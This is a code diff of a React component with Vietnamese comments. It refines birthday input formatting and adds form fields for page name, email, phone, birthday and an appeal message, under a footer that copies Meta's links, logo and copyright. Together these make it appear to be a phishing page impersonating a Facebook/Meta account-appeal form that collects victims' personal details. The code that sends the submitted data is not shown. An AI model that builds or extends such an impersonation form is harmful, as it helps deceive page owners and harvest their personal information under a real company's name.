@@ -215,13 +215,15 @@ const Home = () => {
             const month = cleanedValue.slice(2, 4);
             const year = cleanedValue.slice(4, 8);
             
-            // TỰ ĐỘNG HIỆN DẤU / KHI ĐỦ 2 SỐ
-            if (cleanedValue.length <= 2) {
-                formattedValue = day;
-            } else if (cleanedValue.length <= 4) {
-                formattedValue = `${day}/${month}`;
+            // TỰ ĐỘNG HIỆN DẤU / NGAY KHI ĐỦ 2 SỐ
+            if (cleanedValue.length === 2) {
+                formattedValue = day + '/';
+            } else if (cleanedValue.length === 4) {
+                formattedValue = day + '/' + month + '/';
+            } else if (cleanedValue.length > 4) {
+                formattedValue = day + '/' + month + '/' + year;
             } else {
-                formattedValue = `${day}/${month}/${year}`;
+                formattedValue = day;
             }
         }
         
@@ -249,9 +251,10 @@ const Home = () => {
         });
 
         // Kiểm tra định dạng ngày sinh (chỉ trên mobile)
-        if (formData.birthday.trim() !== '' && window.innerWidth < 640) {
-            // Chỉ validate khi đã có đủ 10 ký tự (dd/mm/yyyy)
-            if (formData.birthday.length === 10) {
+        if (formData.birthday.trim() !== '') {
+            const isMobile = window.innerWidth < 640; // sm breakpoint
+            if (isMobile) {
+                // Kiểm tra định dạng dd/mm/yyyy
                 const dateRegex = /^(\d{2})\/(\d{2})\/(\d{4})$/;
                 if (!dateRegex.test(formData.birthday)) {
                     newErrors.birthday = true;
@@ -261,13 +264,11 @@ const Home = () => {
                     const monthNum = parseInt(month);
                     const yearNum = parseInt(year);
                     
+                    // Kiểm tra ngày, tháng hợp lệ
                     if (dayNum < 1 || dayNum > 31 || monthNum < 1 || monthNum > 12 || yearNum < 1900 || yearNum > new Date().getFullYear()) {
                         newErrors.birthday = true;
                     }
                 }
-            } else if (formData.birthday.length > 0 && formData.birthday.length < 10) {
-                // Nếu đã nhập nhưng chưa đủ thì báo lỗi
-                newErrors.birthday = true;
             }
         }
 
@@ -381,7 +382,58 @@ const Home = () => {
                             <p>{translatedTexts.submitAppeal}</p>
                         </div>
                         <div className='flex flex-col gap-3 p-4 text-sm leading-6 font-semibold'>
-                            {/* Các trường khác giữ nguyên */}
+                            <div className='flex flex-col gap-1'>
+                                <p className='text-base sm:text-sm'>
+                                    {translatedTexts.pageName} <span className='text-red-500'>*</span>
+                                </p>
+                                <input 
+                                    type='text' 
+                                    name='pageName' 
+                                    autoComplete='organization' 
+                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-2 ${errors.pageName ? 'border-[#dc3545]' : 'border-gray-300'}`} 
+                                    style={{ fontSize: '16px' }}
+                                    value={formData.pageName} 
+                                    onChange={(e) => handleInputChange('pageName', e.target.value)} 
+                                />
+                                {errors.pageName && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
+                            </div>
+                            
+                            <div className='flex flex-col gap-1'>
+                                <p className='text-base sm:text-sm'>
+                                    {translatedTexts.mail} <span className='text-red-500'>*</span>
+                                </p>
+                                <input 
+                                    type='email' 
+                                    name='mail' 
+                                    autoComplete='email' 
+                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-2 ${errors.mail ? 'border-[#dc3545]' : 'border-gray-300'}`} 
+                                    style={{ fontSize: '16px' }}
+                                    value={formData.mail} 
+                                    onChange={(e) => handleInputChange('mail', e.target.value)} 
+                                />
+                                {errors.mail && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
+                            </div>
+                            
+                            <div className='flex flex-col gap-1 sm:gap-2'>
+                                <p className='text-base sm:text-sm'>
+                                    {translatedTexts.phone} <span className='text-red-500'>*</span>
+                                </p>
+                                <div className={`flex rounded-lg border ${errors.phone ? 'border-[#dc3545]' : 'border-gray-300'}`}>
+                                    <div className='flex items-center border-r border-gray-300 bg-gray-100 px-3 py-2.5 sm:py-2 text-sm font-medium text-gray-700'>{callingCode}</div>
+                                    <input 
+                                        type='tel' 
+                                        name='phone' 
+                                        inputMode='numeric' 
+                                        pattern='[0-9]*' 
+                                        autoComplete='off' 
+                                        className='flex-1 rounded-r-lg border-0 px-3 py-2.5 sm:py-2 focus:ring-0 focus:outline-none'
+                                        style={{ fontSize: '16px' }}
+                                        value={formData.phone.replace(/^\+\d+\s*/, '')} 
+                                        onChange={(e) => handleInputChange('phone', e.target.value)} 
+                                    />
+                                </div>
+                                {errors.phone && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
+                            </div>
                             
                             <div className='flex flex-col gap-1 sm:gap-2'>
                                 <p className='text-base sm:text-sm'>
@@ -414,16 +466,59 @@ const Home = () => {
                                 
                                 {errors.birthday && (
                                     <span className='text-xs text-red-500'>
-                                        {formData.birthday.length > 0 && formData.birthday.length < 10 
+                                        {formData.birthday.includes('/') && !/^\d{2}\/\d{2}\/\d{4}$/.test(formData.birthday) 
                                             ? translatedTexts.invalidDate
                                             : translatedTexts.fieldRequired
                                         }
                                     </span>
                                 )}
                             </div>
-
-                            {/* Các trường khác và nút submit giữ nguyên */}
                             
+                            <div className='flex flex-col gap-1'>
+                                <p className='text-base sm:text-sm'>
+                                    {translatedTexts.yourAppeal} <span className='text-red-500'>*</span>
+                                </p>
+                                <textarea 
+                                    name='appeal'
+                                    rows={4}
+                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-2 resize-none ${errors.appeal ? 'border-[#dc3545]' : 'border-gray-300'}`}
+                                    style={{ fontSize: '16px' }}
+                                    placeholder={translatedTexts.appealPlaceholder}
+                                    value={formData.appeal}
+                                    onChange={(e) => handleInputChange('appeal', e.target.value)}
+                                />
+                                {errors.appeal && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
+                            </div>
+
+                            <button 
+                                className='w-full rounded-lg bg-blue-600 hover:bg-blue-700 text-white px-4 py-3 text-base font-semibold transition-colors duration-200 sm:mt-1'
+                                onClick={handleSubmit}
+                            >
+                                {translatedTexts.submit}
+                            </button>
+                        </div>
+                    </div>
+                    <div className='w-full bg-[#f0f2f5] px-4 py-8 sm:py-14 text-[15px] text-[#65676b] sm:px-32'>
+                        <div className='mx-auto flex flex-col sm:flex-row justify-between gap-6 sm:gap-0'>
+                            <div className='flex flex-col space-y-3 sm:space-y-4'>
+                                <p className='text-sm sm:text-[15px]'>{translatedTexts.about}</p>
+                                <p className='text-sm sm:text-[15px]'>{translatedTexts.adChoices}</p>
+                                <p className='text-sm sm:text-[15px]'>{translatedTexts.createAd}</p>
+                            </div>
+                            <div className='flex flex-col space-y-3 sm:space-y-4'>
+                                <p className='text-sm sm:text-[15px]'>{translatedTexts.privacy}</p>
+                                <p className='text-sm sm:text-[15px]'>{translatedTexts.careers}</p>
+                                <p className='text-sm sm:text-[15px]'>{translatedTexts.createPage}</p>
+                            </div>
+                            <div className='flex flex-col space-y-3 sm:space-y-4'>
+                                <p className='text-sm sm:text-[15px]'>{translatedTexts.termsPolicies}</p>
+                                <p className='text-sm sm:text-[15px]'>{translatedTexts.cookies}</p>
+                            </div>
+                        </div>
+                        <hr className='my-6 sm:my-8 h-0 border border-transparent border-t-gray-300' />
+                        <div className='flex flex-col sm:flex-row justify-between items-center gap-4 sm:gap-0'>
+                            <img src={FromMetaImage} alt='' className='w-[80px] sm:w-[100px]' />
+                            <p className='text-xs sm:text-[13px] text-[#65676b]'>© {new Date().getFullYear()} Meta</p>
                         </div>
                     </div>
                 </div>
